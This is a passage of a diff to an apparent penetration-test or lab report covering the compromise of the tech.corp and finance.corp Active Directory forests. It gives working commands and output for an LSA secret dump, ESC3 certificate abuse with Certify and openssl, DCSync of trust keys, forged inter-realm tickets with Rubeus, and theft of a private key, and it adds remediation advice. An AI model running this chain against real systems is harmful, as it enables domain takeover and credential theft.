+<p>On ADMINSRV86, dump LSA secrets and recover the <code>causer</code> service password in
 cleartext:</p>
 <pre><code class="language-text">Secret : _SC_SNMPTRAP / service 'SNMPTRAP' with username : causer@tech.corp
 cur/text: Ca@8170734525364357
 </code></pre>
-<p><img alt="causer password recovered from the SNMPTRAP LSA secret" class="evidence" src="images/img56.png">
-The <code>ADMINSRV86$</code> machine account is also recovered:</p>
+<figure id="figure-56" class="evidence"><img alt="causer password recovered from the SNMPTRAP LSA secret" class="evidence" src="images/img56.png"><figcaption>causer password recovered from the SNMPTRAP LSA secret</figcaption></figure>
+<p>The <code>ADMINSRV86$</code> machine account is also recovered:</p>
 <pre><code class="language-text">* Username : adminsrv86$
 * Domain   : TECH
 * NTLM     : 390d9db95b492e45c4e43b85d2b9c432
 </code></pre>
+<figure id="figure-57"><img alt="ADMINSRV86$ machine account recovered" src="images/img57.png"><figcaption>ADMINSRV86$ machine account recovered</figcaption></figure>
+<figure id="figure-58" class="evidence"><img alt="Credential dump on ADMINSRV86" class="evidence" src="images/img58.png"><figcaption>Credential dump on ADMINSRV86</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Remove the <code>Self-Membership</code> ACE that lets <code>TECHSRV30$</code> join <code>srvusers</code>,
@@ -757,15 +848,19 @@ PFX:</p>
 .\openssl\openssl.exe pkcs12 -in .\esc3agent.pem -keyex `
   -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out .\esc3agent.pfx
 </code></pre>
-<figure id="figure-18"><img alt="Requesting the FIDO enrollment-agent certificate as causer" src="images/img60.png"><figcaption>Requesting the FIDO enrollment-agent certificate as causer</figcaption></figure>
+<figure id="figure-59"><img alt="Requesting the FIDO enrollment-agent certificate as causer" src="images/img60.png"><figcaption>Requesting the FIDO enrollment-agent certificate as causer</figcaption></figure>
+<figure id="figure-60"><img alt="causer identified as a principal able to enrol in the FIDO (ESC3) template" src="images/img50.png"><figcaption>causer identified as a principal able to enrol in the FIDO (ESC3) template</figcaption></figure>
+<figure id="figure-61"><img alt="Launching a logon session as causer (runas /netonly)" src="images/img59.png"><figcaption>Launching a logon session as causer (runas /netonly)</figcaption></figure>
+<figure id="figure-62" class="evidence"><img alt="Converting the enrollment-agent certificate to PFX" class="evidence" src="images/img61.png"><figcaption>Converting the enrollment-agent certificate to PFX</figcaption></figure>
 <p>Use the agent certificate to request a certificate <strong>on behalf of</strong>
 <code>techadmin</code> from the <code>FIDOUsers</code> template:</p>
 <pre><code class="language-powershell">.\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDOUsers `
   /onbehalfof:TECH\techadmin /enrollcert:.\esc3agent.pfx /enrollcertpw:123456
 # [*] CA Response : The certificate had been issued.
 </code></pre>
-<p><img alt="On-behalf-of certificate issued for the Domain Admin techadmin" class="evidence" src="images/img62.png">
-Convert the <code>techadmin</code> certificate and authenticate via PKINIT to receive a
+<figure id="figure-63" class="evidence"><img alt="On-behalf-of certificate issued for the Domain Admin techadmin" class="evidence" src="images/img62.png"><figcaption>On-behalf-of certificate issued for the Domain Admin techadmin</figcaption></figure>
+<figure id="figure-64" class="evidence"><img alt="Converting the techadmin certificate to PFX" class="evidence" src="images/img63.png"><figcaption>Converting the techadmin certificate to PFX</figcaption></figure>
+<p>Convert the <code>techadmin</code> certificate and authenticate via PKINIT to receive a
 <strong>Domain Admin TGT</strong>:</p>
 <pre><code class="language-powershell">.\openssl\openssl.exe pkcs12 -in .\esc3DA.pem -keyex `
   -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out .\esc3DA.pfx
@@ -781,7 +876,7 @@ winrs -r:tech-dc.tech.corp &quot;whoami &amp;&amp; hostname&quot;
 #  tech\techadmin
 #  tech-dc
 </code></pre>
-<figure id="figure-19" class="evidence"><img alt="Domain Admin TGT via PKINIT and OS command execution on TECH-DC" class="evidence" src="images/img65.png"><figcaption>Domain Admin TGT via PKINIT and OS command execution on TECH-DC</figcaption></figure>
+<figure id="figure-65" class="evidence"><img alt="Domain Admin TGT via PKINIT and OS command execution on TECH-DC" class="evidence" src="images/img65.png"><figcaption>Domain Admin TGT via PKINIT and OS command execution on TECH-DC</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Remove the <strong>Certificate Request Agent</strong> EKU from the <code>FIDO</code> template, or
@@ -837,8 +932,10 @@ keys and the <code>krbtgt</code> hash:</p>
 <pre><code class="language-text">[ In ] TECH.CORP -&gt; FINANCE.CORP
   rc4_hmac_nt   a0ba8caa534fc2f186ca86ea7b5cee6e     &lt;-- inter-realm trust key
 </code></pre>
-<p><img alt="Inter-realm trust keys extracted via DCSync" class="evidence" src="images/img67.png">
-<strong>Attempted approach (blocked by SID filtering).</strong> A cross-forest Golden
+<figure id="figure-66" class="evidence"><img alt="Inter-realm trust keys extracted via DCSync" class="evidence" src="images/img67.png"><figcaption>Inter-realm trust keys extracted via DCSync</figcaption></figure>
+<figure id="figure-67" class="evidence"><img alt="lsadump::evasive-trust /patch: In / Out inter-realm trust keys" class="evidence" src="images/img66.png"><figcaption>lsadump::evasive-trust /patch: In / Out inter-realm trust keys</figcaption></figure>
+<figure id="figure-68" class="evidence"><img alt="DCSync of tech\krbtgt (hash used in the superseded attempt)" class="evidence" src="images/img68.png"><figcaption>DCSync of tech\krbtgt (hash used in the superseded attempt)</figcaption></figure>
+<p><strong>Attempted approach (blocked by SID filtering).</strong> A cross-forest Golden
 Ticket using the <code>tech\krbtgt</code> hash with SID history for <code>finance.corp</code>
 Enterprise Admins (RID 519) was rejected by the quarantined trust:</p>
 <pre><code class="language-powershell"># Superseded: foreign RID 519 stripped by SID filtering on the trust
@@ -860,8 +957,9 @@ impersonating the native <code>finance.corp</code> administrator <code>finadmin<
 <pre><code class="language-powershell">.\Rubeus.exe asktgs /ticket:finadmin_in.kirbi `
   /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt /nowrap
 </code></pre>
-<p><img alt="Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket" class="evidence" src="images/img69.png">
-Access the cross-forest share; it exposes an <strong>unencrypted</strong> private key
+<figure id="figure-69" class="evidence"><img alt="Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket" class="evidence" src="images/img69.png"><figcaption>Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</figcaption></figure>
+<figure id="figure-70" class="evidence"><img alt="CIFS service ticket obtained; TechOperations share lists finadmin.pem" class="evidence" src="images/img70.png"><figcaption>CIFS service ticket obtained; TechOperations share lists finadmin.pem</figcaption></figure>
+<p>Access the cross-forest share; it exposes an <strong>unencrypted</strong> private key
 <code>finadmin.pem</code>. The <code>openssl</code> conversion only prompts for an <em>export</em>
 password (the one being set), never an <em>import</em> password, proving the PEM
 held an unprotected private key:</p>
@@ -873,13 +971,14 @@ copy \\finance-dc.finance.corp\TechOperations\finadmin.pem `
   -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out finadmin.pfx
 # Enter Export Password:  &lt;-- only an EXPORT prompt: the PEM key was unencrypted
 </code></pre>
-<p><img alt="Unencrypted finadmin.pem stolen from the cross-forest share and converted" class="evidence" src="images/img71.png">
-Authenticate as <code>finadmin</code> with <strong>PKINIT</strong>, spawning a fresh logon session
+<figure id="figure-71" class="evidence"><img alt="Unencrypted finadmin.pem stolen from the cross-forest share and converted" class="evidence" src="images/img71.png"><figcaption>Unencrypted finadmin.pem stolen from the cross-forest share and converted</figcaption></figure>
+<p>Authenticate as <code>finadmin</code> with <strong>PKINIT</strong>, spawning a fresh logon session
 via <code>/createnetonly</code> and injecting the TGT into it:</p>
 <pre><code class="language-powershell">.\Rubeus.exe asktgt /user:finadmin /certificate:.\finadmin.pfx /password:&lt;pfx-password&gt; `
   /domain:finance.corp /dc:finance-dc.finance.corp `
   /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 </code></pre>
+<figure id="figure-72" class="evidence"><img alt="PKINIT as finadmin: Domain Admin TGT issued for finance.corp" class="evidence" src="images/img72.png"><figcaption>PKINIT as finadmin: Domain Admin TGT issued for finance.corp</figcaption></figure>
 <p>Verify the ticket, confirm remote access, and read the <strong>final flag</strong>
 locally on FINANCE-DC:</p>
 <pre><code class="language-powershell">klist
@@ -889,13 +988,13 @@ winrs -r:finance-dc.finance.corp &quot;whoami &amp;&amp; hostname&quot;
 #  finance\finadmin
 #  finance-dc
 </code></pre>
-<figure id="figure-20" class="evidence"><img alt="PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin" class="evidence" src="images/img73.png"><figcaption>PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</figcaption></figure>
+<figure id="figure-73" class="evidence"><img alt="PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin" class="evidence" src="images/img73.png"><figcaption>PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</figcaption></figure>
 <pre><code class="language-text">winrs -r:finance-dc.finance.corp cmd
 C:\Users\finadmin&gt; cd Desktop
 C:\Users\finadmin\Desktop&gt; type finalflag.txt
 64061b82-fb44-48d5-b2d2-761766634e30
 </code></pre>
-<figure id="figure-21" class="evidence"><img alt="Final objective flag read on FINANCE-DC as finadmin" class="evidence" src="images/img74.png"><figcaption>Final objective flag read on FINANCE-DC as finadmin</figcaption></figure>
+<figure id="figure-74" class="evidence"><img alt="Final objective flag read on FINANCE-DC as finadmin" class="evidence" src="images/img74.png"><figcaption>Final objective flag read on FINANCE-DC as finadmin</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li><strong>Enforce SID filtering / selective authentication</strong> on the <code>finance.corp</code>
